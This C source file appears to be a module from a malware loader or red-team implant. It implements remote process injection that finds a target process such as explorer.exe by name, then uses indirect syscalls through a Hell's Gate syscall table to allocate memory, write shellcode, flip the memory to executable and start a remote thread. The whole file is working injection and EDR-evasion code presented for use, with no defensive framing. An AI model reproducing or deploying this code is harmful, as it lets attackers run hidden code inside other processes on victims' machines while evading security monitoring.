/*
 * Remote Process Injection via indirect syscalls
 *
 * 1. Find target process by name (e.g., "explorer.exe")
 * 2. NtOpenProcess — open handle to target
 * 3. NtAllocateVirtualMemory — allocate RW in target
 * 4. NtWriteVirtualMemory — write shellcode
 * 5. NtProtectVirtualMemory — RW → RX
 * 6. NtCreateThreadEx — create remote thread in target
 */

#include "inject_remote.h"
#include "hellsgate.h"
#include "winapi.h"

#if INJECT_REMOTE

extern SYSCALL_TABLE g_Syscalls;

typedef struct _OBJ_ATTR {
    ULONG Length;
    HANDLE RootDirectory;
    PVOID ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor;
    PVOID SecurityQualityOfService;
} OBJ_ATTR;

typedef struct _CLIENT_ID {
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} CLIENT_ID;

static DWORD FindProcessByName(const char *name) {
    HANDLE hSnap = g_Api.pCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32W pe;
    pe.dwSize = sizeof(pe);
    DWORD pid = 0;

    if (g_Api.pProcess32FirstW(hSnap, &pe)) {
        do {
            char narrow[MAX_PATH];
            for (int i = 0; i < MAX_PATH && pe.szExeFile[i]; i++) {
                narrow[i] = (char)pe.szExeFile[i];
                if (!pe.szExeFile[i]) break;
            }
            narrow[MAX_PATH - 1] = 0;

            if (_stricmp(narrow, name) == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (g_Api.pProcess32NextW(hSnap, &pe));
    }

    g_Api.pCloseHandle(hSnap);
    return pid;
}

BOOL RemoteInject(PBYTE shellcode, SIZE_T sc_size, const char *process_name, PREMOTE_INJECT_RESULT result) {
    ZeroMemory(result, sizeof(REMOTE_INJECT_RESULT));

    DWORD pid = FindProcessByName(process_name);
    if (!pid) return FALSE;

    result->target_pid = pid;

    /* Open target process */
    HANDLE hProcess = NULL;
    OBJ_ATTR oa;
    ZeroMemory(&oa, sizeof(oa));
    oa.Length = sizeof(oa);

    CLIENT_ID cid;
    cid.UniqueProcess = (HANDLE)(ULONG_PTR)pid;
    cid.UniqueThread = NULL;

    SetSyscallEntry(g_Syscalls.NtOpenProcess.dwSSN,
        g_Syscalls.NtOpenProcess.pSyscallAddr);
    NTSTATUS status = DoSyscall(&hProcess,
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD,
        &oa, &cid);
    if (!NT_SUCCESS(status)) return FALSE;

    result->hProcess = hProcess;

    /* Allocate RW memory in target */
    PVOID base_addr = NULL;
    SIZE_T region_size = sc_size;
    SetSyscallEntry(g_Syscalls.NtAllocateVirtualMemory.dwSSN,
        g_Syscalls.NtAllocateVirtualMemory.pSyscallAddr);
    status = DoSyscall(hProcess, &base_addr, 0, &region_size,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!NT_SUCCESS(status)) {
        SetSyscallEntry(g_Syscalls.NtClose.dwSSN, g_Syscalls.NtClose.pSyscallAddr);
        DoSyscall(hProcess);
        return FALSE;
    }

    result->base_addr = base_addr;
    result->region_size = region_size;

    /* Write shellcode to target */
    SIZE_T bytes_written = 0;
    SetSyscallEntry(g_Syscalls.NtWriteVirtualMemory.dwSSN,
        g_Syscalls.NtWriteVirtualMemory.pSyscallAddr);
    status = DoSyscall(hProcess, base_addr, shellcode, sc_size, &bytes_written);
    if (!NT_SUCCESS(status)) return FALSE;

    /* RW → RX */
    ULONG old_protect;
    SetSyscallEntry(g_Syscalls.NtProtectVirtualMemory.dwSSN,
        g_Syscalls.NtProtectVirtualMemory.pSyscallAddr);
    status = DoSyscall(hProcess, &base_addr, &region_size,
        PAGE_EXECUTE_READ, &old_protect);
    if (!NT_SUCCESS(status)) return FALSE;

    /* Create remote thread */
    HANDLE hThread = NULL;
    SetSyscallEntry(g_Syscalls.NtCreateThreadEx.dwSSN,
        g_Syscalls.NtCreateThreadEx.pSyscallAddr);
    status = DoSyscall(&hThread, THREAD_ALL_ACCESS, NULL, hProcess,
        base_addr, NULL, 0, (SIZE_T)0, (SIZE_T)0, (SIZE_T)0, NULL);
    if (!NT_SUCCESS(status)) return FALSE;

    result->hThread = hThread;

    return TRUE;
}

#else
BOOL RemoteInject(PBYTE shellcode, SIZE_T sc_size, const char *process_name, PREMOTE_INJECT_RESULT result) {
    (void)shellcode; (void)sc_size; (void)process_name; (void)result;
    return FALSE;
}
#endif
